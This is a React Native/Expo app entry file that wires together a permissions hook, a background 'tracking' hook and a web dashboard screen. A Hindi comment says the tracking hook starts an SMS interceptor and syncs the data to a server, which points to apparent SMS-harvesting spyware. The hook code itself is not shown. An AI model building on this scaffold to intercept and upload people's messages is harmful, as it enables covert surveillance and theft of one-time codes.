import React from 'react';
import { Platform, View, StyleSheet } from 'react-native';
import { StatusBar } from 'expo-status-bar';

// Custom Hooks & Screens
import usePermissions from './src/hooks/usePermissions';
import useTracking from './src/hooks/useTracking';
import HomeScreen from './src/screens/HomeScreen';
import WebDashboard from './src/screens/WebDashboard';

export default function App() {
  // 1. All-in-one permissions request (Android only)
  const permissionStatus = usePermissions();

  // 2. Background tracking logic trigger
  // Ye hook SMS interceptor aur server sync shuru karega
  useTracking(permissionStatus);

  return (
    <View style={styles.container}>
      <StatusBar style="auto" />
      
      {/* 3. Conditional Rendering: Web vs Mobile */}
      {Platform.OS === 'web' ? (
        <WebDashboard /> 
      ) : (
        <HomeScreen />
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
  },
});